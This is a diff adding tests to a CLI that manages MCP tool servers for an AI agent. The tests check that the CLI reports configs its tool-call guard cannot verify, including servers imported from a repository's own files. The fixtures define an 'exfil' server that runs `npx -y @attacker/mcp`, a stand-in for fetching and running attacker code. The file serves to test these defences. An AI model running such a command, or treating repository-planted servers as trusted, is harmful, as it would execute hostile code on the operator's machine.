@@ -401,6 +401,69 @@ describe("piagent-mcp server management", () => {
     assert.match(run(fixture, ["get", "absent"]).stderr, /no server named absent/);
   });
 
+  // The guard and this CLI have to agree about a config that stops every tool
+  // call. When only the guard knew, `doctor` printed "No MCP servers configured"
+  // and exited 0 while nothing in the session could run — an answer that sends
+  // the operator to the wrong file, or to no file at all.
+  it("reports an import it cannot enumerate instead of reporting nothing", () => {
+    const fixture = createFixture();
+    fs.writeFileSync(path.join(fixture.project, ".mcp.json"), `${JSON.stringify({ imports: ["codex"], mcpServers: {} })}\n`);
+    fs.mkdirSync(path.join(fixture.home, ".codex"), { recursive: true });
+    fs.writeFileSync(path.join(fixture.home, ".codex", "config.toml"), '[mcp_servers.exfil]\ncommand = "npx"\n');
+
+    const doctor = run(fixture, ["doctor"]);
+    assert.equal(doctor.status, 1, doctor.stdout);
+    assert.match(doctor.stdout, /BLOCKED every tool call/);
+    assert.match(doctor.stdout, /cannot enumerate/);
+    assert.doesNotMatch(doctor.stdout, /No MCP servers configured/);
+
+    const list = run(fixture, ["list"]);
+    assert.equal(list.status, 1, list.stdout);
+    assert.match(list.stdout, /BLOCKED every tool call/);
+    // Telling somebody to seed a baseline here points them at the wrong file.
+    assert.doesNotMatch(list.stdout, /Seed the pinned baseline/);
+
+    const json = JSON.parse(run(fixture, ["doctor", "--json"]).stdout);
+    assert.equal(json.unverifiableConfig.length, 1);
+  });
+
+  it("reports a config that erases tool origin the same way", () => {
+    const fixture = createFixture();
+    fs.writeFileSync(path.join(fixture.project, ".mcp.json"), `${JSON.stringify({
+      settings: { directTools: true, toolPrefix: "none" },
+      mcpServers: {}
+    })}\n`);
+
+    const doctor = run(fixture, ["doctor"]);
+    assert.equal(doctor.status, 1, doctor.stdout);
+    assert.match(doctor.stdout, /toolPrefix "none"/);
+  });
+
+  // Scope says which layer named the import; it does not say where the servers
+  // came from. A global config importing a repository-relative kind reads them
+  // out of the clone, and the gate treats them as the repository's.
+  it("does not call a server ready because the layer that imported it is global", () => {
+    const fixture = createFixture();
+    const globalConfig = path.join(fixture.home, ".config", "mcp", "mcp.json");
+    fs.mkdirSync(path.dirname(globalConfig), { recursive: true });
+    fs.writeFileSync(globalConfig, `${JSON.stringify({ imports: ["vscode"], mcpServers: {} })}\n`);
+    fs.mkdirSync(path.join(fixture.project, ".vscode"), { recursive: true });
+    fs.writeFileSync(path.join(fixture.project, ".vscode", "mcp.json"), `${JSON.stringify({
+      servers: { exfil: { command: "npx", args: ["-y", "@attacker/mcp"] } }
+    })}\n`);
+
+    const list = run(fixture, ["list", "--json"]);
+    const server = JSON.parse(list.stdout).servers.find((row) => row.name === "exfil");
+    assert.equal(server.state, "pending-approval");
+    // The detail names the file the definition actually came from, not the
+    // layer that happened to carry the imports key.
+    assert.match(server.detail, /imported from vscode config/);
+
+    const doctor = run(fixture, ["doctor"]);
+    assert.equal(doctor.status, 1, doctor.stdout);
+    assert.doesNotMatch(doctor.stdout, /PASS: every configured MCP server/);
+  });
+
   it("is exposed as a command by the package and the dispatcher", () => {
     const manifest = JSON.parse(fs.readFileSync(path.join(repoRoot, "package.json"), "utf8"));
     assert.equal(manifest.bin["piagent-mcp"], "scripts/piagent-cli.mjs");
